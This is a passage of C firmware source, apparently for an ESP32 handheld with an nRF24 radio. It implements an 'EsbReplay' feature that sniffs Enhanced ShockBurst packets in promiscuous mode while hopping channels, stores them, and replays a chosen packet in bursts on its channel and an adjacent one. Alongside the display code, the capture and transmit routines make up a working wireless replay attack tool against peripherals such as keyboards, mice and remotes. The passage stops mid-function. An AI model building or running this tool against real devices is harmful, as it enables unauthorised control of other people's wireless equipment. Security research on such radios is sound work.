enum { EsbReplay_kRpLogBottomPad = 4 };
enum { EsbReplay_kRpStatPadX = 10 };
enum { EsbReplay_kRpStatValueX = 70 };
enum { EsbReplay_kRpStatTextDy = 2 };
enum { EsbReplay_kRpUiMinIntervalMs = 100 };
enum { EsbReplay_kRpHopIntervalMs = 80 };
enum { EsbReplay_kRpReplayBursts = 4 };
enum { EsbReplay_kRpReplayGapMs = 8 };

static const uint8_t EsbReplay_kRpHopChannels[] = {2,  5,  10, 26, 40, 50, 60,
                                                   70, 76, 78, 79, 80, 83};
enum {
  EsbReplay_kRpHopCount = sizeof(EsbReplay_kRpHopChannels) /
  sizeof(EsbReplay_kRpHopChannels[0])
};
static const uint8_t EsbReplay_kRpPromiscAddr[5] = {0xAA, 0xAA, 0xAA, 0xAA,
                                                    0xAA};

typedef struct EsbReplay_RpCapture {
  bool used;
  uint8_t channel;
  uint8_t len;
  uint8_t data[EsbReplay_kRpPayloadMax];
} EsbReplay_RpCapture;
#define EsbReplay_RpCapture_INITIALIZER {.used = false, .channel = 0, .len = 0}
;

static bool EsbReplay_uiDrawn = false;
static volatile bool EsbReplay_s_active = false;
static bool EsbReplay_s_armed = true;
static bool EsbReplay_s_hopping = true;
static bool EsbReplay_s_playing = false;
static uint8_t EsbReplay_s_channel = 76;
static int EsbReplay_s_hopIndex = 0;
static uint32_t EsbReplay_s_lastHopMs = 0;
static uint32_t EsbReplay_s_heardTotal = 0;

static EsbReplay_RpCapture EsbReplay_s_caps[EsbReplay_kRpMaxCaptures];
static int EsbReplay_s_capCount = 0;
static int EsbReplay_s_selIndex = 0;
static int EsbReplay_s_selScroll = 0;

enum {
  EsbReplay_s_selBuffer_COUNT = EsbReplay_kRpMaxSelLines,
  EsbReplay_s_selBuffer_OFFSET = 0
};
_Static_assert(EsbReplay_s_selBuffer_OFFSET + EsbReplay_s_selBuffer_COUNT <=
                   FEATURE_TEXT_SLOTS,
               "Feature text capacity");
#define EsbReplay_s_selBuffer                  \
  (*(text_t(*)[EsbReplay_s_selBuffer_COUNT]) & \
   feature_text_slots[EsbReplay_s_selBuffer_OFFSET])
static uint16_t EsbReplay_s_selColor[EsbReplay_kRpMaxSelLines];
static int EsbReplay_s_selLineCount = 0;
enum {
  EsbReplay_s_selDrawn_COUNT = EsbReplay_kRpMaxSelLines,
  EsbReplay_s_selDrawn_OFFSET = EsbReplay_s_selBuffer_OFFSET +
      EsbReplay_s_selBuffer_COUNT
};
_Static_assert(EsbReplay_s_selDrawn_OFFSET + EsbReplay_s_selDrawn_COUNT <=
                   FEATURE_TEXT_SLOTS,
               "Feature text capacity");
#define EsbReplay_s_selDrawn                  \
  (*(text_t(*)[EsbReplay_s_selDrawn_COUNT]) & \
   feature_text_slots[EsbReplay_s_selDrawn_OFFSET])
static uint16_t EsbReplay_s_selDrawnColor[EsbReplay_kRpMaxSelLines];
static int EsbReplay_s_selDrawnW[EsbReplay_kRpMaxSelLines];

enum {
  EsbReplay_s_logBuffer_COUNT = EsbReplay_kRpMaxLogLines,
  EsbReplay_s_logBuffer_OFFSET = EsbReplay_s_selDrawn_OFFSET +
      EsbReplay_s_selDrawn_COUNT
};
_Static_assert(EsbReplay_s_logBuffer_OFFSET + EsbReplay_s_logBuffer_COUNT <=
                   FEATURE_TEXT_SLOTS,
               "Feature text capacity");
#define EsbReplay_s_logBuffer                  \
  (*(text_t(*)[EsbReplay_s_logBuffer_COUNT]) & \
   feature_text_slots[EsbReplay_s_logBuffer_OFFSET])
static uint16_t EsbReplay_s_logColor[EsbReplay_kRpMaxLogLines];
static int EsbReplay_s_logIndex = 0;
enum {
  EsbReplay_s_logDrawn_COUNT = EsbReplay_kRpMaxLogLines,
  EsbReplay_s_logDrawn_OFFSET = EsbReplay_s_logBuffer_OFFSET +
      EsbReplay_s_logBuffer_COUNT
};
_Static_assert(EsbReplay_s_logDrawn_OFFSET + EsbReplay_s_logDrawn_COUNT <=
                   FEATURE_TEXT_SLOTS,
               "Feature text capacity");
#define EsbReplay_s_logDrawn                  \
  (*(text_t(*)[EsbReplay_s_logDrawn_COUNT]) & \
   feature_text_slots[EsbReplay_s_logDrawn_OFFSET])
static uint16_t EsbReplay_s_logDrawnColor[EsbReplay_kRpMaxLogLines];
static int EsbReplay_s_logDrawnW[EsbReplay_kRpMaxLogLines];

enum {
  EsbReplay_s_statusText_COUNT = EsbReplay_kRpStatusLines,
  EsbReplay_s_statusText_OFFSET = EsbReplay_s_logDrawn_OFFSET +
      EsbReplay_s_logDrawn_COUNT
};
_Static_assert(EsbReplay_s_statusText_OFFSET + EsbReplay_s_statusText_COUNT <=
                   FEATURE_TEXT_SLOTS,
               "Feature text capacity");
#define EsbReplay_s_statusText                  \
  (*(text_t(*)[EsbReplay_s_statusText_COUNT]) & \
   feature_text_slots[EsbReplay_s_statusText_OFFSET])
static uint16_t EsbReplay_s_statusColor[EsbReplay_kRpStatusLines];
static int EsbReplay_s_statusDrawnW[EsbReplay_kRpStatusLines];

static bool EsbReplay_s_logDirty = false;
static bool EsbReplay_s_statusDirty = false;
static bool EsbReplay_s_selDirty = false;
static uint32_t EsbReplay_s_lastUiMs = 0;

static int EsbReplay_rpLogBoxBottom(void) {
  return bleContentBottom() - EsbReplay_kRpLogBottomPad;
}
static int EsbReplay_rpLogBoxH(void) {
  const int h = EsbReplay_rpLogBoxBottom() - EsbReplay_kRpLogBoxTop;
  return h > (EsbReplay_kRpBoxHeaderH + EsbReplay_kRpLineHeight)
             ? h
             : (EsbReplay_kRpBoxHeaderH + EsbReplay_kRpLineHeight);
}
static int EsbReplay_rpLogEndY(void) {
  return EsbReplay_kRpLogBoxTop + EsbReplay_rpLogBoxH() - 2;
}
static int EsbReplay_rpVisibleLogLines(void) {
  const int avail = EsbReplay_rpLogEndY() - EsbReplay_kRpLogStartY;
  if (avail <= 0) return 1;
  const int n = avail / EsbReplay_kRpLineHeight;
  return n < 1 ? 1
               : (n > EsbReplay_kRpMaxLogLines ? EsbReplay_kRpMaxLogLines : n);
}
static int EsbReplay_rpSelEndY(void) {
  return EsbReplay_kRpSelBoxTop + EsbReplay_kRpSelBoxH - 2;
}

static uint8_t EsbReplay_rpGetRegister(uint8_t r) {
  uint8_t c;
  spi_device_select(&(EsbReplay_radio_transport));
  spi_device_transfer(&(EsbReplay_radio_transport), r & 0x1F);
  c = spi_device_transfer(&(EsbReplay_radio_transport), 0);
  spi_device_deselect(&(EsbReplay_radio_transport));
  return c;
}

static void EsbReplay_rpSetRegister(uint8_t r, uint8_t v) {
  spi_device_select(&(EsbReplay_radio_transport));
  spi_device_transfer(&(EsbReplay_radio_transport), (r & 0x1F) | 0x20);
  spi_device_transfer(&(EsbReplay_radio_transport), v);
  spi_device_deselect(&(EsbReplay_radio_transport));
}

static void EsbReplay_rpWriteRegMulti(uint8_t reg, const uint8_t* data,
                                      uint8_t len) {
  spi_device_select(&(EsbReplay_radio_transport));
  spi_device_transfer(&(EsbReplay_radio_transport), (reg & 0x1F) | 0x20);
  for (uint8_t i = 0; i < len; i++)
    spi_device_transfer(&(EsbReplay_radio_transport), data[i]);
  spi_device_deselect(&(EsbReplay_radio_transport));
}

static void EsbReplay_rpDisable(void) { gpio_set_level(((gpio_num_t)(CE)), 0); }
static void EsbReplay_rpEnable(void) { gpio_set_level(((gpio_num_t)(CE)), 1); }

static void EsbReplay_rpPowerUp(void) {
  EsbReplay_rpSetRegister(_RP_CONFIG,
                          EsbReplay_rpGetRegister(_RP_CONFIG) | 0x02);
  esp_rom_delay_us(130);
}

static void EsbReplay_rpPowerDown(void) {
  EsbReplay_rpSetRegister(_RP_CONFIG,
                          EsbReplay_rpGetRegister(_RP_CONFIG) & ~0x02);
}

static void EsbReplay_rpFlushRx(void) {
  spi_device_select(&(EsbReplay_radio_transport));
  spi_device_transfer(&(EsbReplay_radio_transport), 0xE2);
  spi_device_deselect(&(EsbReplay_radio_transport));
}

static void EsbReplay_rpFlushTx(void) {
  spi_device_select(&(EsbReplay_radio_transport));
  spi_device_transfer(&(EsbReplay_radio_transport), 0xE1);
  spi_device_deselect(&(EsbReplay_radio_transport));
}

static void EsbReplay_rpInitSpi(void) {
  spi_device_init(&(EsbReplay_radio_transport), DIV_SD_HOST, SD_SCLK, SD_MISO,
                  SD_MOSI, CSN, 8000000, false);
}

static void EsbReplay_rpApplyChannel(uint8_t ch) {
  EsbReplay_rpDisable();
  EsbReplay_rpSetRegister(_RP_RF_CH, ch);
  EsbReplay_rpFlushRx();
  if (EsbReplay_s_armed && !EsbReplay_s_playing) {
    EsbReplay_rpEnable();
    esp_rom_delay_us(130);
  }
}

static void EsbReplay_rpConfigureRx(void) {
  EsbReplay_rpDisable();
  EsbReplay_rpPowerUp();
  EsbReplay_rpWriteRegMulti(_RP_RX_ADDR_P0, EsbReplay_kRpPromiscAddr, 5);
  EsbReplay_rpSetRegister(_RP_EN_AA, 0x00);
  EsbReplay_rpSetRegister(_RP_EN_RXADDR, 0x01);
  EsbReplay_rpSetRegister(_RP_SETUP_AW, 0x03);
  EsbReplay_rpSetRegister(_RP_SETUP_RETR, 0x00);
  EsbReplay_rpSetRegister(_RP_RF_SETUP, 0x0F);
  EsbReplay_rpSetRegister(_RP_RX_PW_P0, EsbReplay_kRpPayloadMax);
  EsbReplay_rpSetRegister(_RP_CONFIG, 0x0B);  // CRC on, PWR_UP, PRIM_RX
  EsbReplay_rpApplyChannel(EsbReplay_s_channel);
  if (EsbReplay_s_armed) {
    EsbReplay_rpEnable();
    esp_rom_delay_us(130);
  }
}

static void EsbReplay_rpConfigureTx(uint8_t ch) {
  EsbReplay_rpDisable();
  EsbReplay_rpPowerUp();
  EsbReplay_rpWriteRegMulti(_RP_TX_ADDR, EsbReplay_kRpPromiscAddr, 5);
  EsbReplay_rpWriteRegMulti(_RP_RX_ADDR_P0, EsbReplay_kRpPromiscAddr, 5);
  EsbReplay_rpSetRegister(_RP_EN_AA, 0x00);
  EsbReplay_rpSetRegister(_RP_EN_RXADDR, 0x01);
  EsbReplay_rpSetRegister(_RP_SETUP_AW, 0x03);
  EsbReplay_rpSetRegister(_RP_SETUP_RETR, 0x00);
  EsbReplay_rpSetRegister(_RP_RF_SETUP, 0x0F);
  EsbReplay_rpSetRegister(_RP_RF_CH, ch);
  EsbReplay_rpSetRegister(_RP_CONFIG, 0x0E);  // CRC on, PWR_UP, PRIM_TX
  EsbReplay_rpFlushTx();
  EsbReplay_rpFlushRx();
}

static void EsbReplay_rpPaintTextLine(int x, int y, int maxW, int lineH,
                                      text_t* cacheText, uint16_t* cacheColor,
                                      int* cacheW, text_t text,
                                      uint16_t color) {
  if ((strcmp(((*cacheText)).data, (text).data) == 0) && (*cacheColor) == color)
    return;
  display_set_text_datum(&(tft), TL_DATUM);
  display_set_text_size(&(tft), 1);
  const int newW = strlen((text).data)
                       ? (display_text_width(&(tft), (text).data, 0) + 2)
                       : 0;
  int clearW = (*cacheW) > newW ? (*cacheW) : newW;
  if (clearW < 8) clearW = maxW;
  if (clearW > maxW) clearW = maxW;
  display_fill_rect(&(tft), x, y, clearW, lineH, TFT_BLACK);
  if (strlen((text).data)) {
    display_set_text_color_2(&(tft), color, TFT_BLACK);
    display_set_cursor(&(tft), x, y + EsbReplay_kRpStatTextDy);
    display_print(&(tft), (text).data);
  }
  (*cacheText) = text;
  (*cacheColor) = color;
  (*cacheW) = newW > 0 ? newW : 0;
}

static void EsbReplay_rpAppendLog(text_t text, uint16_t color) {
  const int visible = EsbReplay_rpVisibleLogLines();
  for (int i = visible - 1; i > 0; i--) {
    EsbReplay_s_logBuffer[i] = EsbReplay_s_logBuffer[i - 1];
    EsbReplay_s_logColor[i] = EsbReplay_s_logColor[i - 1];
  }
  EsbReplay_s_logBuffer[0] = text;
  EsbReplay_s_logColor[0] = color;
  if (EsbReplay_s_logIndex < visible) EsbReplay_s_logIndex++;
  EsbReplay_s_logDirty = true;
}

static text_t EsbReplay_rpPayloadHex(const uint8_t* p, int len, int maxBytes) {
  char buf[3 * 12 + 1];
  int pos = 0;
  const int n = len < maxBytes ? len : maxBytes;
  for (int i = 0; i < n && pos < (int)sizeof(buf) - 3; i++) {
    pos += snprintf(buf + pos, sizeof(buf) - pos, "%02X", p[i]);
  }
  if (len > maxBytes && pos < (int)sizeof(buf) - 3) {
    buf[pos++] = '.';
    buf[pos++] = '.';
    buf[pos++] = '.';
  }
  buf[pos] = '\0';
  return TEXT(buf);
}

static void EsbReplay_rpClampSelScroll(void) {
  if (EsbReplay_s_capCount <= 0) {
    EsbReplay_s_selScroll = 0;
    return;
  }
  if (EsbReplay_s_selIndex < EsbReplay_s_selScroll)
    EsbReplay_s_selScroll = EsbReplay_s_selIndex;
  if (EsbReplay_s_selIndex >= EsbReplay_s_selScroll + EsbReplay_kRpSelVisible) {
    EsbReplay_s_selScroll = EsbReplay_s_selIndex - EsbReplay_kRpSelVisible + 1;
  }
  if (EsbReplay_s_selScroll < 0) EsbReplay_s_selScroll = 0;
  const int maxScroll = EsbReplay_s_capCount > EsbReplay_kRpSelVisible
                            ? (EsbReplay_s_capCount - EsbReplay_kRpSelVisible)
                            : 0;
  if (EsbReplay_s_selScroll > maxScroll) EsbReplay_s_selScroll = maxScroll;
}

static void EsbReplay_rpRebuildSelect(void) {
  EsbReplay_rpClampSelScroll();
  EsbReplay_s_selLineCount = 0;
  for (int i = 0; i < EsbReplay_kRpMaxSelLines; i++) {
    EsbReplay_s_selBuffer[i] = TEXT("");
    EsbReplay_s_selColor[i] = UI_DIM_TEXT;
  }

  if (EsbReplay_s_capCount == 0) {
    EsbReplay_s_selBuffer[0] = TEXT("[*] No packets yet");
    EsbReplay_s_selColor[0] = UI_DIM_TEXT;
    EsbReplay_s_selBuffer[1] = TEXT("    Arm, then Prev/Next");
    EsbReplay_s_selColor[1] = UI_DIM_TEXT;
    EsbReplay_s_selLineCount = 2;
  } else {
    for (int row = 0; row < EsbReplay_kRpSelVisible; row++) {
      const int idx = EsbReplay_s_selScroll + row;
      if (idx >= EsbReplay_s_capCount) break;
      __auto_type c = &(EsbReplay_s_caps[idx]);
      const bool selected = (idx == EsbReplay_s_selIndex);
      text_t line = TEXT(selected ? "> " : "  ");
      text_append_cstr(&(line), (TEXT(idx + 1)).data);
      text_append_cstr(&(line), "/");
      text_append_cstr(&(line), (TEXT(EsbReplay_s_capCount)).data);
      text_append_cstr(&(line), " ch");
      text_append_cstr(&(line), (TEXT((*c).channel)).data);
      text_append_cstr(&(line), " [");
      text_append_cstr(&(line), (TEXT((*c).len)).data);
      text_append_cstr(&(line), "] ");
      text_append_cstr(&(line),
                       (EsbReplay_rpPayloadHex((*c).data, (*c).len, 5)).data);
      EsbReplay_s_selBuffer[row] = line;
      EsbReplay_s_selColor[row] = selected ? ORANGE : UI_TEXT;
      EsbReplay_s_selLineCount++;
    }
  }
  EsbReplay_s_selDirty = true;
}

static void EsbReplay_rpRedrawSelect(void) {
  const int endY = EsbReplay_rpSelEndY();
  const int maxW = display_width(&(tft)) - 16;
  display_set_text_datum(&(tft), TL_DATUM);
  for (int i = 0; i < EsbReplay_kRpSelVisible; i++) {
    const int y = EsbReplay_kRpSelStartY + i * EsbReplay_kRpLineHeight;
    if (y + EsbReplay_kRpLineHeight > endY) break;
    if (i < EsbReplay_s_selLineCount) {
      EsbReplay_rpPaintTextLine(
          EsbReplay_kRpStatPadX, y, maxW, EsbReplay_kRpLineHeight,
          &(EsbReplay_s_selDrawn[i]), &(EsbReplay_s_selDrawnColor[i]),
          &(EsbReplay_s_selDrawnW[i]), EsbReplay_s_selBuffer[i],
          EsbReplay_s_selColor[i]);
    } else {
      EsbReplay_rpPaintTextLine(
          EsbReplay_kRpStatPadX, y, maxW, EsbReplay_kRpLineHeight,
          &(EsbReplay_s_selDrawn[i]), &(EsbReplay_s_selDrawnColor[i]),
          &(EsbReplay_s_selDrawnW[i]), TEXT(""), UI_DIM_TEXT);
    }
  }
  EsbReplay_s_selDirty = false;
}

static void EsbReplay_rpRedrawLog(void) {
  const int endY = EsbReplay_rpLogEndY();
  const int visible = EsbReplay_rpVisibleLogLines();
  const int maxW = display_width(&(tft)) - 16;
  display_set_text_datum(&(tft), TL_DATUM);
  for (int i = 0; i < visible; i++) {
    const int y = EsbReplay_kRpLogStartY + i * EsbReplay_kRpLineHeight;
    if (y + EsbReplay_kRpLineHeight > endY) break;
    if (i < EsbReplay_s_logIndex) {
      EsbReplay_rpPaintTextLine(
          EsbReplay_kRpStatPadX, y, maxW, EsbReplay_kRpLineHeight,
          &(EsbReplay_s_logDrawn[i]), &(EsbReplay_s_logDrawnColor[i]),
          &(EsbReplay_s_logDrawnW[i]), EsbReplay_s_logBuffer[i],
          EsbReplay_s_logColor[i]);
    } else {
      EsbReplay_rpPaintTextLine(
          EsbReplay_kRpStatPadX, y, maxW, EsbReplay_kRpLineHeight,
          &(EsbReplay_s_logDrawn[i]), &(EsbReplay_s_logDrawnColor[i]),
          &(EsbReplay_s_logDrawnW[i]), TEXT(""), UI_DIM_TEXT);
    }
  }
  EsbReplay_s_logDirty = false;
}

static void EsbReplay_rpDrawStatusValue(int line, text_t text, uint16_t color) {
  if (line < 0 || line >= EsbReplay_kRpStatusLines) return;
  const int y = EsbReplay_kRpStatusTextY + line * EsbReplay_kRpLineHeight;
  const int maxW = display_width(&(tft)) - EsbReplay_kRpStatValueX - 8;
  EsbReplay_rpPaintTextLine(
      EsbReplay_kRpStatValueX, y, maxW, EsbReplay_kRpLineHeight,
      &(EsbReplay_s_statusText[line]), &(EsbReplay_s_statusColor[line]),
      &(EsbReplay_s_statusDrawnW[line]), text, color);
}

static void EsbReplay_rpUpdateStatusPanel(void) {
  char chVal[24];
  snprintf(chVal, sizeof(chVal), "%u%s", (unsigned)EsbReplay_s_channel,
           EsbReplay_s_hopping ? " hop" : "");
  EsbReplay_rpDrawStatusValue(0, TEXT(chVal),
                              EsbReplay_s_hopping ? ORANGE : UI_TEXT);

  char capVal[24];
  snprintf(capVal, sizeof(capVal), "%d / %d", EsbReplay_s_capCount,
           EsbReplay_kRpMaxCaptures);
  EsbReplay_rpDrawStatusValue(1, TEXT(capVal),
                              EsbReplay_s_capCount > 0 ? UI_OK : UI_DIM_TEXT);

  if (EsbReplay_s_playing) {
    EsbReplay_rpDrawStatusValue(2, TEXT("Playing"), UI_WARN);
  } else if (EsbReplay_s_armed) {
    EsbReplay_rpDrawStatusValue(2, TEXT("Armed"), UI_OK);
  } else {
    EsbReplay_rpDrawStatusValue(2, TEXT("Idle"), UI_DIM_TEXT);
  }
  EsbReplay_s_statusDirty = false;
}

static void EsbReplay_rpDrawTextBoxes(void) {
  const int logH = EsbReplay_rpLogBoxH();
  const int endY = EsbReplay_rpLogEndY();
  display_fill_rect(&(tft), 0, EsbReplay_kRpStatusY - 2, display_width(&(tft)),
                    endY - EsbReplay_kRpStatusY + 4, TFT_BLACK);
  display_draw_fast_h_line(&(tft), 0, 19, display_width(&(tft)), UI_LINE);
  display_draw_round_rect(&(tft), 4, EsbReplay_kRpStatusY,
                          display_width(&(tft)) - 8, EsbReplay_kRpStatusBoxH, 3,
                          UI_LINE);
  display_draw_round_rect(&(tft), 4, EsbReplay_kRpSelBoxTop,
                          display_width(&(tft)) - 8, EsbReplay_kRpSelBoxH, 3,
                          UI_LINE);
  display_draw_round_rect(&(tft), 4, EsbReplay_kRpLogBoxTop,
                          display_width(&(tft)) - 8, logH, 3, UI_LINE);

  display_set_text_datum(&(tft), TL_DATUM);
  display_set_text_size(&(tft), 1);
  display_set_text_color_2(&(tft), UI_DIM_TEXT, TFT_BLACK);
  display_set_cursor(&(tft), EsbReplay_kRpStatPadX, EsbReplay_kRpStatusY + 3);
  display_print(&(tft), "Replay");
  display_set_cursor(&(tft), EsbReplay_kRpStatPadX, EsbReplay_kRpSelBoxTop + 3);
  display_print(&(tft), "Select");
  display_set_cursor(&(tft), EsbReplay_kRpStatPadX, EsbReplay_kRpLogBoxTop + 3);
  display_print(&(tft), "Activity");

  static const char* kLabels[EsbReplay_kRpStatusLines] = {"Ch", "Saved",
                                                          "State"};
  for (int i = 0; i < EsbReplay_kRpStatusLines; i++) {
    const int y = EsbReplay_kRpStatusTextY + i * EsbReplay_kRpLineHeight +
                  EsbReplay_kRpStatTextDy;
    display_set_text_color_2(&(tft), UI_DIM_TEXT, TFT_BLACK);
    display_set_cursor(&(tft), EsbReplay_kRpStatPadX, y);
    display_print(&(tft), (TEXT(kLabels[i])).data);
    EsbReplay_s_statusText[i] = TEXT("");
    EsbReplay_s_statusColor[i] = 0;
    EsbReplay_s_statusDrawnW[i] = 0;
  }
  for (int i = 0; i < EsbReplay_kRpMaxSelLines; i++) {
    EsbReplay_s_selDrawn[i] = TEXT("");
    EsbReplay_s_selDrawnColor[i] = 0;
    EsbReplay_s_selDrawnW[i] = 0;
  }
  for (int i = 0; i < EsbReplay_kRpMaxLogLines; i++) {
    EsbReplay_s_logDrawn[i] = TEXT("");
    EsbReplay_s_logDrawnColor[i] = 0;
    EsbReplay_s_logDrawnW[i] = 0;
  }
}

static void EsbReplay_rpFlushUi(bool force) {
  const uint32_t now = sys_monotonic_ms();
  if (!force && (now - EsbReplay_s_lastUiMs) < EsbReplay_kRpUiMinIntervalMs)
    return;
  if (!force && !EsbReplay_s_logDirty && !EsbReplay_s_statusDirty &&
      !EsbReplay_s_selDirty)
    return;
  EsbReplay_s_lastUiMs = now;
  if (EsbReplay_s_statusDirty || force) EsbReplay_rpUpdateStatusPanel();
  if (EsbReplay_s_selDirty || force) {
    EsbReplay_rpRebuildSelect();
    EsbReplay_rpRedrawSelect();
  }
  if (EsbReplay_s_logDirty || force) EsbReplay_rpRedrawLog();
}

static int EsbReplay_rpTrimLen(const uint8_t* p, int maxLen) {
  int len = maxLen;
  while (len > 1 && p[len - 1] == 0x00) len--;
  return len;
}

static bool EsbReplay_rpInteresting(const uint8_t* p, int len) {
  if (len < 2) return false;
  int zeros = 0, ff = 0;
  for (int i = 0; i < len; i++) {
    if (p[i] == 0x00) zeros++;
    if (p[i] == 0xFF) ff++;
  }
  return !(zeros >= len - 1 || ff >= len - 1);
}

static void EsbReplay_rpStoreCapture(uint8_t ch, const uint8_t* data,
                                     uint8_t len) {
  // Dedup identical latest packet
  if (EsbReplay_s_capCount > 0) {
    __auto_type last = &(EsbReplay_s_caps[0]);
    if ((*last).used && (*last).channel == ch && (*last).len == len &&
        memcmp((*last).data, data, len) == 0) {
      return;
    }
  }

  // Newest at index 0
  for (int i = EsbReplay_kRpMaxCaptures - 1; i > 0; i--) {
    EsbReplay_s_caps[i] = EsbReplay_s_caps[i - 1];
  }
  EsbReplay_s_caps[0].used = true;
  EsbReplay_s_caps[0].channel = ch;
  EsbReplay_s_caps[0].len = len;
  memcpy(EsbReplay_s_caps[0].data, data, len);
  if (EsbReplay_s_capCount < EsbReplay_kRpMaxCaptures) EsbReplay_s_capCount++;
  EsbReplay_s_selIndex = 0;
  EsbReplay_s_selScroll = 0;
  EsbReplay_s_selDirty = true;
  EsbReplay_s_statusDirty = true;
  EsbReplay_rpAppendLog(
      text_join_cstr(
          (text_join_cstr(
               (text_join_cstr(
                    (text_join_cstr(
                         (text_join_cstr("+ ch", (TEXT(ch)).data)).data, " ["))
                        .data,
                    (TEXT(len)).data))
                   .data,
               "] "))
              .data,
          (EsbReplay_rpPayloadHex(data, len, 8)).data),
      UI_OK);
}

static bool EsbReplay_rpRxAvailable(void) {
  return (EsbReplay_rpGetRegister(_RP_STATUS) & 0x40) != 0;
}

static void EsbReplay_rpPollCapture(void) {
  if (!EsbReplay_s_armed || EsbReplay_s_playing) return;
  uint8_t guard = 0;
  while (EsbReplay_rpRxAvailable() && guard < 6) {
    uint8_t payload[EsbReplay_kRpPayloadMax];
    spi_device_select(&(EsbReplay_radio_transport));
    spi_device_transfer(&(EsbReplay_radio_transport), 0x61);
    for (int i = 0; i < EsbReplay_kRpPayloadMax; i++)
      payload[i] = spi_device_transfer(&(EsbReplay_radio_transport), 0xFF);
    spi_device_deselect(&(EsbReplay_radio_transport));
    EsbReplay_rpSetRegister(_RP_STATUS, 0x70);

    const int len = EsbReplay_rpTrimLen(payload, EsbReplay_kRpPayloadMax);
    if (EsbReplay_rpInteresting(payload, len)) {
      EsbReplay_s_heardTotal++;
      EsbReplay_rpStoreCapture(EsbReplay_s_channel, payload, (uint8_t)len);
    }
    guard++;
  }
}

static void EsbReplay_rpStepHop(void) {
  if (!EsbReplay_s_armed || EsbReplay_s_playing || !EsbReplay_s_hopping) return;
  const uint32_t now = sys_monotonic_ms();
  if (now - EsbReplay_s_lastHopMs < EsbReplay_kRpHopIntervalMs) return;
  EsbReplay_s_lastHopMs = now;
  EsbReplay_s_hopIndex = (EsbReplay_s_hopIndex + 1) % EsbReplay_kRpHopCount;
  EsbReplay_s_channel = EsbReplay_kRpHopChannels[EsbReplay_s_hopIndex];
  EsbReplay_rpApplyChannel(EsbReplay_s_channel);
  EsbReplay_s_statusDirty = true;
}

static void EsbReplay_rpWritePayload(const uint8_t* data, uint8_t len) {
  spi_device_select(&(EsbReplay_radio_transport));
  spi_device_transfer(&(EsbReplay_radio_transport), 0xA0);
  for (uint8_t i = 0; i < len; i++)
    spi_device_transfer(&(EsbReplay_radio_transport), data[i]);
  spi_device_deselect(&(EsbReplay_radio_transport));
  EsbReplay_rpSetRegister(_RP_STATUS, 0x70);
  EsbReplay_rpEnable();
  esp_rom_delay_us(15);
  EsbReplay_rpDisable();
  esp_rom_delay_us(150);
}

void EsbReplay_runUI(void);

static void EsbReplay_rpPlaySelected(void) {
  if (EsbReplay_s_capCount <= 0 || EsbReplay_s_selIndex < 0 ||
      EsbReplay_s_selIndex >= EsbReplay_s_capCount) {
    EsbReplay_rpAppendLog(TEXT("[!] No capture selected"), UI_WARN);
    EsbReplay_rpFlushUi(true);
    return;
  }
  if (EsbReplay_s_playing) return;

  const EsbReplay_RpCapture cap = EsbReplay_s_caps[EsbReplay_s_selIndex];
  EsbReplay_s_playing = true;
  EsbReplay_s_statusDirty = true;
  EsbReplay_rpFlushUi(true);
  EsbReplay_rpAppendLog(
      text_join_cstr(
          (text_join_cstr(
               (text_join_cstr("[>] Play ch", (TEXT(cap.channel)).data)).data,
               " x"))
              .data,
          (TEXT(EsbReplay_kRpReplayBursts)).data),
      UI_WARN);
  EsbReplay_rpFlushUi(true);

  EsbReplay_rpConfigureTx(cap.channel);
  for (uint8_t n = 0; n < EsbReplay_kRpReplayBursts; n++) {
    if (feature_exit_requested || featureExitButtonPressed()) break;
    EsbReplay_rpWritePayload(cap.data, cap.len);
    sys_sleep_ms(EsbReplay_kRpReplayGapMs);
    // Nearby channels help hopping receivers
    if (n == 1) {
      EsbReplay_rpSetRegister(_RP_RF_CH, (uint8_t)((cap.channel + 1) % 84));
    } else if (n == 2) {
      EsbReplay_rpSetRegister(_RP_RF_CH, cap.channel);
    }
    maintainTouchNavBar();
    EsbReplay_runUI();
  }

  EsbReplay_rpConfigureRx();
  EsbReplay_s_playing = false;
  EsbReplay_rpAppendLog(TEXT("[+] Replay done"), UI_OK);
  EsbReplay_s_statusDirty = true;
  EsbReplay_rpFlushUi(true);
}

static void EsbReplay_rpToggleArm(void) {
  EsbReplay_s_armed = !EsbReplay_s_armed;
  if (EsbReplay_s_armed) {
    EsbReplay_rpConfigureRx();
    EsbReplay_rpAppendLog(TEXT("[+] Armed — capturing"), UI_OK);
  } else {
    EsbReplay_rpDisable();
    EsbReplay_rpAppendLog(TEXT("[*] Capture paused"), UI_DIM_TEXT);
  }
  EsbReplay_s_statusDirty = true;
  EsbReplay_rpFlushUi(true);
}

static void EsbReplay_rpClearCaptures(void) {
  for (int i = 0; i < EsbReplay_kRpMaxCaptures; i++)
    EsbReplay_s_caps[i].used = false;
  EsbReplay_s_capCount = 0;
  EsbReplay_s_selIndex = 0;
  EsbReplay_s_selScroll = 0;
  EsbReplay_s_selDirty = true;
  EsbReplay_s_statusDirty = true;
  EsbReplay_rpAppendLog(TEXT("[*] Captures cleared"), UI_DIM_TEXT);
  EsbReplay_rpFlushUi(true);
}

static void EsbReplay_rpPrev(void) {
  if (EsbReplay_s_capCount <= 0) return;
  EsbReplay_s_selIndex =
      (EsbReplay_s_selIndex - 1 + EsbReplay_s_capCount) % EsbReplay_s_capCount;
  EsbReplay_s_selDirty = true;
  EsbReplay_s_statusDirty = true;
  EsbReplay_rpFlushUi(true);
}

static void EsbReplay_rpNext(void) {
  if (EsbReplay_s_capCount <= 0) return;
  EsbReplay_s_selIndex = (EsbReplay_s_selIndex + 1) % EsbReplay_s_capCount;
  EsbReplay_s_selDirty = true;
  EsbReplay_s_statusDirty = true;
  EsbReplay_rpFlushUi(true);
}

static void EsbReplay_rpSelectAt(int idx) {
  if (idx < 0 || idx >= EsbReplay_s_capCount) return;
  if (idx == EsbReplay_s_selIndex) return;
  EsbReplay_s_selIndex = idx;
  EsbReplay_s_selDirty = true;
  EsbReplay_s_statusDirty = true;
  EsbReplay_rpFlushUi(true);
}

static unsigned long EsbReplay_s_rpLastBtnMs = 0;

static void EsbReplay_rpWaitNavRelease(int pin) {
  const uint32_t t0 = sys_monotonic_ms();
  while (isTouchNavButtonPressed(pin) && sys_monotonic_ms() - t0 < 400)
    sys_sleep_ms(5);
  sys_sleep_ms(30);
}

void EsbReplay_rpHandleNavButtons(void) {
  if (!featureHasTouchNavBar()) return;
  if (sys_monotonic_ms() - EsbReplay_s_rpLastBtnMs < 80) return;

  if (isTouchNavButtonPressedEdge(BTN_LEFT)) {
    EsbReplay_rpPrev();
    EsbReplay_s_rpLastBtnMs = sys_monotonic_ms();
    EsbReplay_rpWaitNavRelease(BTN_LEFT);
    return;
  }
  if (isTouchNavButtonPressedEdge(BTN_RIGHT)) {
